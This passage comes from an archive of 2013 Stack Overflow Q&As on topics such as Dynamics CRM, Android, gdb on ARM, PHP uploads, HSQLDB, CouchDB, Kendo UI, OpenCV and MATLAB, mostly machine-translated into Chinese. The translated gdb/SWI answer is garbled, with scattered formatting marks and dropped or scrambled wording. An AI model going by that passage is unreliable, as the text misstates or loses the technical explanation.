我的问题是，为了创建发现服务代理，我需要指定设备凭据，这是使用身份验证过程获取的，我试图确定其类型。这是第22条...

如何仅根据发现或组织服务的 URL 确定身份验证类型？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T19:11:42.403

我只是在这里放了一个小样本。测试*LiveID*和*ActiveDirectory*。

```
IServiceManagement<IOrganizationService> organizationServiceManagement 
  = ServiceConfigurationFactory.CreateManagement<IOrganizationService>(
    new Uri("http ... Organization.svc"));
AuthenticationProviderType authenticationProvierType 
  = organizationServiceManagement.AuthenticationType;

Console.WriteLine(authenticationProvierType);
Console.ReadKey(); 
```

# android - Android 4.2.x 中滚动限制的样式

> ID：15159148
> 
> 赞同：0
> 
> 时间：2013-03-01T13:39:31.093
> 
> 标签：android, styles, scroll, themes

我正在尝试为我的 android 应用程序创建一个自定义主题。我正在两个不同的设备 HTC One X (4.1) 和 Google Nexus 4 (4.2) 上测试我的应用程序。现在我遇到了主题滚动/滑动行为的问题，例如在 ViewPagers order ListViews 中。很难解释，所以我做了一个截图。

![在此处输入图像描述](../Images/64af88ede49f40795e0e07c2bd2a2f4d.png)

[http://imageshack.us/a/img835/3572/blueshadow.jpg](http://imageshack.us/a/img835/3572/blueshadow.jpg)

当达到视图的滚动限制时，是否可以删除出现的样式的订单更改？这确实出现在 nexus 4 上，但没有出现在 HTC One X 上。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-08T18:33:27.830

```
viewPager.setOverScrollMode(ViewPager.OVER_SCROLL_NEVER); 
```

和

```
listView.setOverScrollMode(ListView.OVER_SCROLL_NEVER); 
```

解决了这个问题。

感谢原始答案：[列表视图的蓝边滚动线。安卓](https://stackoverflow.com/questions/9967455/blue-edge-scroll-lines-of-listview-android)

# java - 这是一个“易于理解”的数据结构吗？

> ID：15159151
> 
> 赞同：-5
> 
> 时间：2013-03-01T13:39:43.763
> 
> 标签：java, data-structures

这是一个项目列表的数据结构，其中每个列表包含一个 4 个字符串的列表，每个 4 个项目的列表包含一个 5 个字符串的列表：

```
List<List<List<String>>> l = new ArrayList<ArrayList<ArrayList<String>>>(); 
```

有没有更“可读”的方式来定义这个数据结构？

jsp 文件需要这种结构来显示数据。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-01T13:43:13.153

尝试使用类来给事物起一个*有意义的名称*，而不是“字符串列表列表”，这根本*没有*意义。

除了描述*技术*方面，类型名称还应该描述*含义*。

每当您最终编写看起来像这样的代码时，您都需要开始做 OOP！

因为迟早您将*使用*带有意大利面条代码的数据结构，如下所示：

```
 if (a.get(0).get(0).get(0).equals("banana")) { 
```

啊啊啊。错误代码警告！开始*命名类*和添加方法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T13:43:36.800

就在这里。

```
List<List<List<String>>> l = new ArrayList<>(); 
```

（适用于 java 1.7 或更高版本）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T14:04:27.773

我相信如果你真的因为某些可怕的原因需要这个结构，用类制作 OOP 模型，并制作一个转换器`List<List<List<String>>>`
我相信它更容易理解你在做什么，如果你不只需将带有一些神秘逻辑的字符串的 3 维列表扔在那里。我保证，如果你一年后回顾代码，你不会记得你是如何填充结构的所有原因，如果我得到一个使用这种结构的 3rd 方程序，我会不高兴。

# epub - Android epub阅读器开发临近

> ID：15159156
> 
> 赞同：1
> 
> 时间：2013-03-01T13:39:52.377
> 
> 标签：epub, solution, ebook-reader

我正在为能够显示日语垂直文本的 epub 阅读器项目编写提案。首先，我想知道一个图书阅读器加载和阅读epub的主要流程，然后定义关键点/主要技术需要关注的提案。

这里对书阅读器的要求是具备基本功能：阅读书籍，显示当前/总页数，到书的任意位置。

据我了解，主要流程如下：

1.  BReader 将 epub 提取到 xhtml 文件
2.  BReader 将所有 xhtml 文件加载到 webview
3.  BR 添加 js 以将文本旋转到垂直。js可以是[nehan](https://code.google.com/p/nehan/)
4.  BR 添加 js 以根据设备屏幕规范分隔页面
5.  渲染当前页面

但是，在步骤（2）中，如果它加载了所有的 xhtml 文件，那么对于大型 epub 来说性能会很差。我研究了一些 Epub 阅读器，比如“SONY 的电子书阅读器”和“NeoSoar”，发现每个 epub 文件的打开 epub 的时间都是相同的（大约 5 秒），所以我相信它们只加载了一部分第一时间预定。

他们怎么能这样做？如果他们只加载 epub 的一部分，他们如何计算总页数？以及他们怎样才能找到这本书的任何页码？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-08T17:49:14.740

你可能需要参考[这个](http://www.siegmann.nl/epublib/android)。

从[github](https://github.com/downloads/psiegman/epublib/epublib-core-latest.jar) 下载 epublib-core-latest.jar 下载 slf4j-android 将两者都添加到您的 android 项目中

并按照示例进行操作。

# gdb - How to get a call stack from a SoftWare Interrupt exception

> ID：15159164
> 
> 赞同：2
> 
> 时间：2013-03-01T13:40:30.827
> 
> 标签：gdb, arm, bare-metal

I'm trying to debug a program running on a **bare-metal** ARM platform using `gdb`. At some point an `SWI` (Software Interrupt) exception is generated. However the back-trace doesn't show what generated the exception as you can see:

> (gdb) c
> 
> ```
> Continuing. 
> ^C 
> Program received signal SIGTRAP, Trace/breakpoint trap. 0xffff0008 in ?? ()
> (gdb) bt
> #0  0xffff0008 in ?? () 
> ```

The program running on the ARM was compiled with `arm-none-linux-gnueabi-gcc -O2 -c -ggdb`, I also tried using `-O0` with the same result.

How can I get a meaningful call stack? Is there another way to find what is generating this exception?

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-02T18:14:55.533

要了解`gdb`生成堆栈跟踪的问题，您首先必须了解如何`gdb`生成堆栈跟踪。编译器在创建函数时使用标准的*序言*和*结尾，这是函数入口和出口处的**汇编*代码。其中一部分是将 保存在堆栈上，为局部变量保留空间**并**链接前一*帧指针*或. 这些*堆栈帧*提供了一种以 the为*根并通常以**零*终止的链表。这取决于**ABI**（参见[*-mabi*](http://gcc.gnu.org/onlinedocs/gcc-4.7.2/gcc/ARM-Options.html)`C`*`lr`***`fp`**`fp`***[](http://gcc.gnu.org/onlinedocs/gcc-4.7.2/gcc/ARM-Options.html)*）。[**每种 ARM ABI**](http://infocenter.arm.com/help/topic/com.arm.doc.ihi0036b/index.html)类型的细节略有不同，但概念相似。**********

 *******因此，当`SWI`（或任何异常发生）时，它会完全中断已`C`编译代码的流程，并且*帧指针*列表可能难以解码，尤其是在堆栈损坏的情况下。此外，`gdb`不解码程序的上下文。某些系统可能会更改帧指针并立即从 a 切换`exception mode`到`system/supervisor mode`。该`sp`异常甚至可以用作暂存寄存器。输入 后，处理程序的`SWI`部分工作将是保存`user`寄存器 ( `r0-r12`)。在*多任务 O/S*的情况下，这可能会导致`user`堆栈从一个任务到另一个任务的完全变化。

您始终可以通过检查异常模式来确定*故障/导致*指令。`lr`这在[**ARM Architechure**](http://infocenter.arm.com/help/topic/com.arm.doc.subset.architecture.reference/)中指定，并且对于任何**ARM** CPU 都是相同的。`0xfff0008`是默认`SWI`处理程序地址（使用高内存向量表时）。ARM **ARM（架构参考手册）**`SWI`中的除外，

 *** * *

**A2.6.4 软件中断异常**

> 软件中断指令 (SWI) 进入超级用户模式以请求特定的超级用户（操作系统）功能。执行 SWI 时，将执行以下操作：

```
 R14_svc    = address of next instruction after the SWI instruction
   SPSR_svc   = CPSR
   CPSR[4:0]  = 0b10011                 /* Enter Supervisor mode */
   CPSR[5]    = 0                       /* Execute in ARM state */
                                        /* CPSR[6] is unchanged */
   CPSR[7]    = 1                       /* Disable normal interrupts */
                                        /* CPSR[8] is unchanged */
   CPSR[9]    = CP15_reg1_EEbit         /* Endianness on exception entry */
   if high vectors configured then
       PC     = 0xFFFF0008
   else
       PC     = 0x00000008 
```

> 要在执行 SWI 操作后返回，请使用以下指令恢复 PC（来自 R14_svc）和 CPSR（来自 SPSR_svc）并返回到 SWI 之后的指令：

```
 MOVS PC,R14 
```

* * *

如您所见，`R14_svc`即`lr`处于主管模式时，设置为`SWI`指令+4。这样正常返回会重新启动下面的指令。通过检查在哪里`lr`，您可以确定在哪里`SWI`发生。`supervisor`如果用户堆栈没有损坏，您可以使用编译器正在使用`user`的*ABI*通过`fp`. 如果这样做，则`gdb`可以提供堆栈跟踪。但是，在讨论的系统中，没有`SWI`支持代码。

在这种情况下，您还可以编写`gdb`宏来提供堆栈跟踪。但是，我希望很明显，一般而言，这`gdb`将是一项艰巨的任务。*********

# php - i want to get images from folder and upload image into another folder without any input type file?

> ID：15159168
> 
> 赞同：1
> 
> 时间：2013-03-01T13:40:53.960
> 
> 标签：php, mysql

i want to get images from folder and upload image into another folder without any input type file? but i'm getting images from admin/uploads now

**here my page code**

```
<?php
$size = 200; // the thumbnail height
     $filedir = 'uploads/'; // the directory for the original image
     $thumbdir = 'uploads/'; // the directory for the thumbnail image
     $prefix = 'small0_'; // the prefix to be added to the original name
     $maxfile = '2000000';
     $mode = '0666';
     $rnd_1 = rand(11111,99999); 

     $userfile_name= $rnd_1.'_'.$_FILES['image']["name"];
     $userfile_tmp = $_FILES['image']['tmp_name'];
     $userfile_size = $_FILES['image']['size'];
     $userfile_type = $_FILES['image']['type'];
     if (isset($_FILES['image']['name'])) 
     {
         $prod_img = $filedir.$userfile_name;
         $prod_img_thumb = $thumbdir.$prefix.$userfile_name;
         move_uploaded_file($userfile_tmp, $prod_img);
         chmod ($prod_img, octdec($mode));
         $sizes = getimagesize($prod_img);
        $aspect_ratio = $sizes[1]/$sizes[0]; 
         if ($sizes[1] <= $size)
         {

             $new_width = '500';
             $new_height = '500';
         }else{

             $new_width = '500';
             $new_height = '500';
         }
             $destimg=ImageCreateTrueColor($new_width,$new_height)
             or die('Problem In Creating image');

           $srcimg=ImageCreateFromJPEG($prod_img)
         or $srcimg=ImageCreateFromPNG($prod_img)
         or $srcimg=ImageCreateFromGIF($prod_img)
             or die('Problem In opening Source Image0');
         if(function_exists('imagecopyresampled'))
         {
             imagecopyresampled($destimg,$srcimg,0,0,0,0,$new_width,$new_height,ImageSX($srcimg),ImageSY($srcimg))
             or die('Problem In resizing');
         }else{
             Imagecopyresized($destimg,$srcimg,0,0,0,0,$new_width,$new_height,ImageSX($srcimg),ImageSY($srcimg))
             or die('Problem In resizing');
         }
         ImageJPEG($destimg,$prod_img_thumb,90)
             or die('Problem In saving');
     }
?>

 <img name="image" id="image" src="admin/uploads/small0_<?php echo $image?>"   width="150" height="150"> 
```

**Me Getting Image From admin/upload now i want to movie shopping cart product images into another folder without input type file**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T13:43:10.967

如果它已经在服务器上，[`rename`](http://php.net/manual/en/function.rename.php)应该可以解决问题。

# sql - Viewing & adding PDF to database simultaneously

> ID：15159169
> 
> 赞同：1
> 
> 时间：2013-03-01T13:40:56.550
> 
> 标签：sql, sql-server-2008, pdf, coldfusion, coldfusion-10

At the moment I am converting the data on the page to PDF this way:

```
<cfdocument format="PDF">
  <cfoutput>
    #pageContent#
  </cfoutput>
</cfdocument> 
```

With `#pageContent#` being a variable created using `cfsavecontent`

The way it works is that I have a 'Export to PDF' link at the bottom of the page which contains a url variable - this link directs to the same page but the variable passed in tells it to output the PDF.

My question is, when the link is clicked to create the PDF, is there a way to upload the PDF to the database at the same time?

I know I have to use `cffile action="Upload"` and similar, but I'm not sure how to tell the page when a PDF has been opened.

Hope this makes sense.

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T14:50:20.523

您可以使用`filename`属性`cfdocument`将文件直接保存到您选择的位置的服务器中。 [CFdocument 文档。](http://help.adobe.com/en_US/ColdFusion/10.0/CFMLRef/WSc3ff6d0ea77859461172e0811cbec22c24-7c21.html)您还可以查看使用[CFPDF](http://help.adobe.com/en_US/ColdFusion/10.0/CFMLRef/WSc3ff6d0ea77859461172e0811cbec22c24-7995.html)

> **文件名**-*可选*- 包含 PDF 或 FlashPaper 输出的文件的路径名。如果省略文件名属性，ColdFusion 会在浏览器中显示输出。

```
<cfdocument filename = "c:/~" ...> <!--- filename attribute to save to server --->
   #pageContent#
</cfdocument>

<cfquery ...>
    <!--- sql --->
</cfquery>

<!--- once your document is saved and database updated--->
<cflocation url = "[your saved file].pdf"...>
<!--- or as Peter Suggested --->
<cfcontent type="application/pdf" file="[your saved file].pdf"> 
```

# java - HSQLDB delete row(s) from JDBC resultset

> ID：15159170
> 
> 赞同：1
> 
> 时间：2013-03-01T13:41:00.253
> 
> 标签：java, jdbc, hsqldb

I have run into a couple of problems while trying to convert an existing JDBC application to use HSQLDB version 2.2.9 (Currently the codebase runs successfully on MySQL, ORACLE and SQLServer, but an embedded database seemed like a good option too).

I will ask the questions one at a time and separately (although they all relate to the JDBC `ResultSet.deleteRow()` method, supported since HSQLDB 2.0)

Why does `rs.next()` return false after calling `rs.deleteRow()`?

Here is a complete self contained code sample (including simple table creation, sample inserts, and deleting the table at the end):

```
 int deletedRows=0;
    try{
        Connection c = DriverManager.getConnection("jdbc:hsqldb:mem:mytestdb",
                 "SA", "");
        String createSQL =
                 "create table test (num INTEGER PRIMARY KEY, str VARCHAR(25))";
        Statement createStmt = c.createStatement();
        createStmt.execute(createSQL);
        createStmt.close();
        String ins = "insert into test (num,str) values (?,?)";
        PreparedStatement pStmt = c.prepareStatement(ins);
        for(int i=0; i<100; i++){
            pStmt.setInt(1, i);
            pStmt.setString(2, "String"+i);
            pStmt.execute();
        }
        // there should now be 100 rows in the table
        String select = "SELECT * FROM test";
        PreparedStatement stmt = c.prepareStatement(select, 
                ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_UPDATABLE);
        ResultSet rs = stmt.executeQuery();    
        rs.beforeFirst();
        while(rs.next()){
            int num = rs.getInt("num");
            if((num%7)==0){
                System.out.println("Deleting row:"+num);
                rs.deleteRow();
                deletedRows++;
            }
        }
        Statement dropStmt = c.createStatement();
        dropStmt.execute("drop table test;");
        dropStmt.close();
    } catch (SQLException sqle) {
        System.out.println("Deleted "+deletedRows+
                    " rows before exception: "+sqle.getMessage());
        sqle.printStackTrace();
    } 
```

When running the same code on MySQL database, the output shows that every 7th row is deleted:

> Deleting row:0
> 
> Deleting row:7
> 
> ...
> 
> Deleting row: 98

On HSQLDB, the output is:

> Deleting row:0

The `rs.next()` returns false after the first call to `rs.deleteRow()`.

I cannot find any information in the HSQLDB javadoc. Does anyone have any ideas?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T11:36:12.230

Specify the cursor holdability in the code:

```
c.prepareStatement(select,
     ResultSet.TYPE_SCROLL_INSENSITIVE,
     ResultSet.CONCUR_UPDATABLE,
     ResultSet.HOLD_CURSORS_OVER_COMMIT); 
```

The problem seems to be that HSQLDB JDBC driver uses `ResultSet.CLOSE_CURSORS_AT_COMMIT` as the default value.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-02T07:57:50.160

正如我之前评论过的，这听起来像是 HSQLDB JDBC 实现中的一个错误。JDBC 4.1 规范（第 15.2.4.2 节）说：

> 调用该方法后`deleteRow`，光标将定位在下一个有效行之前。如果删除的行是最后一行，则光标将定位在最后一行之后。

这意味着调用`next()`应该已经返回`true`（如果`ResultSet`包含更多行）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-03T20:17:24.583

最有可能的是，您的配置错误。例如，您的类路径中可能有旧版本的 HSQLDB jar。

我用当前的 SVN 代码得到这个输出。自 2.2.9 以来，JDBC 代码没有改变。

```
Deleting row:0
Deleting row:7
Deleting row:14
Deleting row:21
Deleting row:28
Deleting row:35
Deleting row:42
Deleting row:49
Deleting row:56
Deleting row:63
Deleting row:70
Deleting row:77
Deleting row:84
Deleting row:91
Deleting row:98 
```

# android - how to marquee images in android (automatically)?

> ID：15159171
> 
> 赞同：5
> 
> 时间：2013-03-01T13:41:00.930
> 
> 标签：android, android-layout

I want to have the marquee functionality available in html in my android application.I don't know what do we call it in android.

for example,I have four to five images.they need be marquee either from left to right or from right to left.(automatically)

1 note-I am not asking about **Horizontal scroll view**.

What is the procedure and How can i get this feature?

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-02T09:04:53.157

**我得到了答案...对于我的问题**

**它的自动滑梯**

```
 public class AutoSlider extends Activity {

    public int currentimageindex=0;
    Timer timer;
    TimerTask task;
    ImageView slidingimage;

    int[] IMAGE_IDS = {R.drawable.image1, R.drawable.image2, R.drawable.image3,
            R.drawable.image4};

    @Override
    protected void onCreate(Bundle savedInstanceState) 
{
    // TODO Auto-generated method stub
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
        final Handler mHandler = new Handler();

        // Create runnable for posting
        final Runnable mUpdateResults = new Runnable() {
            public void run() {

                AnimateandSlideShow();

            }
        };

        int delay = 1000; // delay for 1 sec.

        int period = 8000; // repeat every 4 sec.

        Timer timer = new Timer();

        timer.scheduleAtFixedRate(new TimerTask() {

        public void run() {

             mHandler.post(mUpdateResults);

        }

        }, delay, period);

    }

    public void onClick(View v) {

        finish();
        android.os.Process.killProcess(android.os.Process.myPid());
      }
       private void AnimateandSlideShow() {

        slidingimage = (ImageView)findViewById(R.id.ImageView_id);
        slidingimage.setImageResource(IMAGE_IDS[currentimageindex%IMAGE_IDS.length]);

        currentimageindex++;

      }

} 
```

在您的 XML 中只有布局和图像视图及其宽度、高度和位置。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T15:10:13.270

You can use the View Pager along with the Timer: On each time tick change the page of the view pager using pager adapter:

> Official defination of View pager:

```
Layout manager that allows the user to flip left and right through pages of data. You supply an implementation of a PagerAdapter to generate the pages that the view shows 
```

Please look at some examples of View pager and view flippers :

[http://www.edumobile.org/android/android-beginner-tutorials/view-pager-example-in-android-development/](http://www.edumobile.org/android/android-beginner-tutorials/view-pager-example-in-android-development/)

[http://wptrafficanalyzer.in/blog/image-slideshow-using-viewflipper-in-android/](http://wptrafficanalyzer.in/blog/image-slideshow-using-viewflipper-in-android/) (Using view flipper)

# c++ - How to create objects for this issue?

> ID：15159174
> 
> 赞同：0
> 
> 时间：2013-03-01T13:41:05.637
> 
> 标签：c++, qt, inheritance, multiple-inheritance, derived-class

First of all I would like to say I am beginner and I did some research on this issue

I created five classes `superbase`, `base` and 3 derived:

```
class superbase
{

    QList<base*> listofbase;  //Composition relation between super base and base

    // some other attributes 

    public:

    superbase(); // or other overloaded constructor

};

class base
{
    int i;

    public:

    base();

};

class derived1 : // Which inheritance should be used with base
{
    int j;

    public:

    derived1();   // or other overloaded constructor

};

class derived2 : // Which inheritance should be used with base
{
    int k;

    public:

    derived2();   // or other overloaded constructor

};

class derived3: // Which inheritance should be used with base
{
    int l;

    public:

    derived3();   // or other overloaded constructor

}; 
```

*   `superbase` and `base` have composition relation
*   `derived1`, `derived2`, `derived3` inherit only from `base` **not `superbase`**
*   There are no methods the classes
*   I also tried virtual inheritance, but I am not getting it properly, as everywhere people mention about a "diamond problem" but this is not the same.

My Task

*   I am supposed to create multiple objects of `base` class as private attribute of `superbase` class( `QList< base* > listofbase;` ). Each object of base class can contain multiple objects of derived classes (`derived1`, `derived2` or `derived3`).

Questions:

1.  How can I create objects for the derived class so that all derived class **share only one single copy of base class object** ?
2.  Which inheritance must be used in derived classes to generate only single copy of base object?

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-03-01T14:05:49.083

使用静态工厂和受保护的构造函数在基类中实现这一点。

# ruby-on-rails-3 - save image from url with paperclip

> ID：15159176
> 
> 赞同：0
> 
> 时间：2013-03-01T13:41:08.783
> 
> 标签：ruby-on-rails-3, paperclip

In my application users can already upload photos from file, but I want to extend this to adding photos from web urls. I've been trying for some time but I just can't get it to work.

I'm using paperclip 3.1.4.

I have this code in my model file

```
require 'open-uri'
class User < ActiveRecord::Base
 # paperclip avatars on S3
 has_attached_file :avatar, {
                  :styles => { :medium => "200x200", :small => "100x100#", :thumb => "64x64#" },
                  :default_url => "/assets/profiles/avatar_default_200x200.png",
                  :path => "/avatars/:style/:id/:filename",
                  :url => "/avatars/:style/:id/:filename"
 }.merge(PAPERCLIP_STORAGE_OPTIONS)

def avatar_from_url(url)
  self.avatar = URI.parse(url)
end 
```

I then use this code to test it

```
- user.avatar_from_url "http://www.wellcomeimageawards.org/stellent/groups/wia/@msh_publishing_group/documents/image/WTVM055068.jpg"
= image_tag user.avatar.url 
```

But in the rendered html the image is blank and the source for the image is given as

[http://s3.amazonaws.com/eightythousand.org/avatars/original//WTVM055068.jpg?1362144498](http://s3.amazonaws.com/eightythousand.org/avatars/original//WTVM055068.jpg?1362144498)

What am I doing wrong?

# c++ - explicit instantiation of a function

> ID：15159181
> 
> 赞同：-1
> 
> 时间：2013-03-01T13:41:28.870
> 
> 标签：c++, explicit-instantiation

Why will i use **explicit instantiation of a function** template, for a type? If I do not use explicit instantiation of the *function*, the template is used to create the necessary function then what is the use of explicit **instantiation**?

```
template <class Any>
void Swap (Any &, Any &);
// template prototype

template <> void Swap<job>(job &, job &);
// explicit specialization for job

int main(void)
{

template void Swap<char>(char &, char &); 
// explicit instantiation for char

short a, b;
Swap(a,b);
// implicit template instantiation for short

job n, m;
Swap(n, m);
// use explicit specialization for job

char g, h;
Swap(g, h);
// use explicit template instantiation for char

} 
```

In the above eg. explicit instantiation is done for char type. What is the use of this?? If the compiler can make use of the template to make a fn for char type.

If there are any refrences that can help me clear my concept, pls do include those.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T13:47:52.710

模板的定义必须在实例化它的每个翻译单元中可用。通常，这是通过在标题中定义模板来实现的；但在某些情况下，您可能不想这样做——也许您不希望您的客户看到实现的源代码。

相反，您可以在标题中声明模板；然后定义它，并在源文件中显式实例化您需要的所有特化。

# synchronization - CouchDB：从数据库之间同步

> ID：15159186
> 
> 赞同：3
> 
> 时间：2013-03-01T13:41:48.450
> 
> 标签：synchronization, couchdb, master-slave

**场景：** 1 个大型 CouchDB 数据库（主数据库）和几个从主数据库连续复制的只读数据库（从属数据库）。

是否可以在从属设备之间配置额外的复制？当主服务器无法访问或连接速度很慢时，是否可以只触发从服务器到从服务器的复制？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T22:44:45.663

无所畏惧地向各个方向复制。Couchdb 允许多主复制，这是使其与大多数其他数据库不同的原因之一。只要考虑到：

*   如果您创建循环复制或非常复杂的路径，有时很难知道数据来自何处。

*   您必须使用自己的工具来监督复制。如果要根据网络条件启用某些数据库之间的复制，则必须为此编写自己的脚本，但这绝对是可行的。

# kendo-ui - Custom Popup Editor not open when grid is empty

> ID：15159188
> 
> 赞同：-1
> 
> 时间：2013-03-01T13:41:50.950
> 
> 标签：kendo-ui

I have made the html template and i am using that template in popup editor.If i have atleast one record in grid then it will perfectly but if there is no data in grid then if click on add button then custom popup editor will not open.There is no error given but popup editor not open.So anybody know solution of this problem?Thanks in advance. **EDIT** this is the template i have used.

```
<script id="teamEditorTemplate" type="text/x-kendo-template">
    <form  method="POST">
 <table>
            <tr>
                <td><div >
                        Area Prefix:                
                    </div></td>
                <td><div>
                        <input name="area_prefix" class="k-input k-textbox" style="text-align: left" id="area_prefix" required  validationMessage="Please Enter Area Prefix"/>                        
                    </div></td>
            </tr>
             <tr>
                <td><div >
                        Area Name:                
                    </div></td>
                <td><div>
                        <input name="area_name" class="k-input k-textbox" style="text-align: left" id="area_name" required  validationMessage="Please Enter Area Name"/>                        
                    </div></td>
            </tr>
             <tr>
                <td><div >
                        Source:                
                    </div></td>
                <td><div>
                        <input name="source" style="text-align: left" id="source" required  validationMessage="Please Select Source"/>                        
                    </div></td>
            </tr>
             <tr>
                <td><div >
                        Country Name:                
                    </div></td>
                <td><div>
                        <input name="vox_country_id" style="text-align: left" id="vox_country_id" required  validationMessage="Please Select Country"/>                        
                    </div></td>
            </tr>

   </table>
    </form>    
</script> 
```

The kendo ui code is here

```
$("#grid").kendoGrid({
            dataSource: dataSource,
           pageSize: 10,
             serverPaging: true,
            serverSorting: true,
            sortable:true,
                pageable: { 
                            refresh: true,
                             pageSizes:[10,20,50,100]
                        },
            height: 400,
            toolbar: [{ name: "create", text: "Add New Area" }],
            columns: [
                { field:"area_prefix", title: "Area Prefix",width:70 },
                { field: "area_name", title:"Area Name",width:90},
                { field: "source", title:"Source",width:70, template: '#= getsourceName(source) #'},
                 { field: "vox_country_id", width:70,template: '#= getCountryName(vox_country_id) #'},
                { command: ["edit", "destroy"], title: "Action",width:53}],
            editable: {
                mode: "popup",            
                template: $("#teamEditorTemplate").html(),
                update: true,  
                add:true,
                destroy: true,

                confirmation: "Are you sure you want to remove ?"
            },
            edit: function(e) {
                if(!e.model.id){
                    $(e.container).parent().find('.k-window-title').html("Add Area Details");
                    $(e.container).parent().find('.k-grid-update').html("Save");
                }
             }
        }); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-04T23:42:30.700

您的问题中缺少一个信息：您如何定义数据源以及什么是`getsourceName`and `getCountryName`。

试图重现您的问题，我写的内容`DataSource`如下：

```
var dataSource = new kendo.data.DataSource({
    data  : [],
    schema: {
        model: {
            id            : "id",
            fields        : {
                area_prefix   : { type: "string" },
                area_name     : { type: "string" },
                source        : { type: "string" },
                vox_country_id: { type: "string" }
            },
            getsourceName : function (d) {
                d = d || "hello";
                return d;
            },
            getCountryName: function (d) {
                d = d || "bye";
                return d;
            }
        }
    }
}); 
```

如果已定义且未定义或，则`getsourceName`返回其中一个（当前值） 。类似的。`d``null``hello``getCountryName`

添加记录时，没有以前的值，很可能会引发一些错误，无法打开弹出窗口。

但是，如果方便地检查 null 那么它应该可以正常工作。

在此处查看我与您的代码放在一起的示例：http: [//jsfiddle.net/OnaBai/wcZ3L/](http://jsfiddle.net/OnaBai/wcZ3L/)

# visual-studio-2010 - 在 Visual C++ 中比较图像和视频

> ID：15159204
> 
> 赞同：0
> 
> 时间：2013-03-01T13:42:45.210
> 
> 标签：visual-studio-2010, visual-studio, visual-studio-2008, visual-c++, opencv

我正在尝试将视频与视频中已经存在的图像（.jpg 格式）（.avi 格式）进行比较。我正在尝试在 Visual C++ 中完成这项任务。当比较两个静态图像时，它会给出正确的结果，但是当将图像与视频进行比较时，在视频中未检测到该图像。我正在使用以下代码来完成上述任务：

```
// project1.1.cpp : Defines the entry point for the console application.

#include "stdafx.h"
#include "opencv2/imgproc/imgproc.hpp"
#include "opencv2/highgui/highgui.hpp"
#include "opencv2/imgproc/imgproc_c.h"
#include "opencv2/legacy/legacy.hpp"
#include <stdio.h>
#include <iostream>

IplImage*  image[2] = { 0, 0 }, *image0 = 0, *image1 = 0;
CvSize size;

int  w0, h0,i;
int  threshold1, threshold2;
int  l,level = 4;
int sthreshold1, sthreshold2;
int  l_comp;
int block_size = 1000;
float  parameter;
double threshold;
double rezult, min_rezult;
int filter = CV_GAUSSIAN_5x5;
CvConnectedComp *cur_comp, min_comp;
CvSeq *comp;
CvMemStorage *storage;

CvPoint pt1, pt2;

static void ON_SEGMENT(int a)
{
  (void)a;
  cvPyrSegmentation(image0, image1, storage, &comp,
                    level, threshold1+1, threshold2+1);

  cvShowImage("Segmentation", image1);
}

using namespace std;
int main( int argc, char** argv ) 
{
    char* filename;

    CvCapture *capture = cvCaptureFromAVI("fractogene.avi");

    if(!capture)
    {   
      printf("!!! cvCaptureFromAVI failed (file not found?)\n");
      while(1);
      return -1; 
    }   

    int fps = (int) cvGetCaptureProperty(capture, CV_CAP_PROP_FPS);

    cvNamedWindow("display_video", CV_WINDOW_AUTOSIZE);

    IplImage* frame = NULL;
    IplImage* frame1 = NULL;
    char key = 0;

    filename = argc == 2 ? argv[1] : (char*)"loadedimage.bmp";

    if( (image[0] = cvLoadImage( filename, 1)) == 0 )
    {
        printf("Cannot load fileimage - %s\n", filename);
        return -1;
    }

    frame1=image[0];

    cvNamedWindow("Source", 0);
    cvShowImage("Source", frame1);

    while (key != 'q')
    {
        frame = cvQueryFrame(capture);

        if (frame==frame1)
            printf("frames matched\n");
        else
            printf("frames not matched\n");

        if (!frame)
        {   
            printf("!!! cvQueryFrame failed: no frame\n");
            break;
        }

        cvShowImage("display_video", frame);

        key = cvWaitKey(1000 / fps);
    }

    cvReleaseCapture(&capture);
    cvWaitKey(0);

    return 0;
} 
```

我的项目即将到期。如果可能，请提供帮助。期待您的回复。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T14:13:02.770

在您的代码中，当您编写 if(frame==frame1) 时，您是在比较指针，而不是图像内容。

比较两个图像的简单方法是逐个比较每个像素。但是这种方法禁止对图像进行任何修改（例如重新压缩、亮度修改、色彩空间修改……）。

有几种方法可以匹配两个可用的图像，并接受内容的微小修改（旋转、缩放、亮度修改......）。我邀请您谷歌“Image Matching OpenCV”并阅读一些研究实验室的文章。

# matlab - 根据一列对矩阵行进行分组

> ID：15159206
> 
> 赞同：3
> 
> 时间：2013-03-01T13:42:47.530
> 
> 标签：matlab, matrix, parallel-processing, grouping, cell

首先，我真的很难把这个问题描述得很好，但我会尝试的。

假设我们有矩阵 A

```
A = [23 1;
     45 1
     78 1
     86 1
     98 2
     1  2
     23 2
     14 3
     15 4
     85 4] 
```

我想要的输出是

```
 B{1} = [23,45,78,86]
    B{2} = [98,1,23]
    B{3} = [14]
    B{4} = [15,85] 
```

请记住，原来的 A 是一个巨大的矩阵，我不想用 for 循环来做这个。我想使用使用并行处理的函数。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-01T14:15:37.893

你可以`accumarray`在这里使用：

```
B = accumarray(A(:,2),A(:,1),[],@(x){x},{}); 
```

如果您知道这`A`是已排序的，并且第二列中没有缺失条目，您还可以使用`mat2cell`：

```
counts = histc(A(:,2),unique(A(:,2)));
B = mat2cell(A(:,1),counts); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T13:48:54.100

